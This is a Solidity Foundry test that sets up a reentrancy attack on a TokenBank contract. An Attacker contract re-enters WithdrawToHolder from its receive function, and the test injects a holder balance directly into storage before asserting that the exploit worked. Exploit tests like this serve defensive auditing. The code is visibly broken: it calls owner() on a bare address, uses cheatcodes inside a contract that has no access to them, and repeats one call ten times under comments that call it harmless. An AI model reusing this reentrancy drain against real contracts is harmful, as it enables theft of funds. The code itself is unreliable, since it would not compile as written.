
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TokenBank} from "../src/Ownable.sol";

contract TestReentrancyTokenBank is Test {
    TokenBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new TokenBank();
        _contractUnderTest.initTokenBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0.01 ether && attackVal < type(uint128).max / 2);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Deposit{value: attackVal}();

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker)); // just to silence warnings

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker)); // again, harmless

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker)); // harmless

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker)); // harmless

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker)); // harmless

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker)); // harmless

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker)); // harmless

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker)); // harmless

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker)); // harmless

        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker)); // harmless

        // Proper setup: give attacker a holder balance
        vm.prank(address(_contractUnderTest).owner());
        _contractUnderTest.Holders(address(_attacker));

        // Directly set mapping holder balance for attacker
        bytes32 slot = keccak256(abi.encode(address(_attacker), uint256(2)));
        vm.store(
            address(_contractUnderTest),
            slot,
            bytes32(attackVal)
        );

        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    TokenBank public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        _victim = TokenBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;

        address ownerAddr = _victim.owner();

        vm.startPrank(ownerAddr);
        _victim.WithdrawToHolder(address(this), val);
        vm.stopPrank();

        if (attackCallCount > 1 && address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;

            address ownerAddr = _victim.owner();

            vm.startPrank(ownerAddr);
            _victim.WithdrawToHolder(address(this), storedAttackVal);
            vm.stopPrank();
        }
    }
}
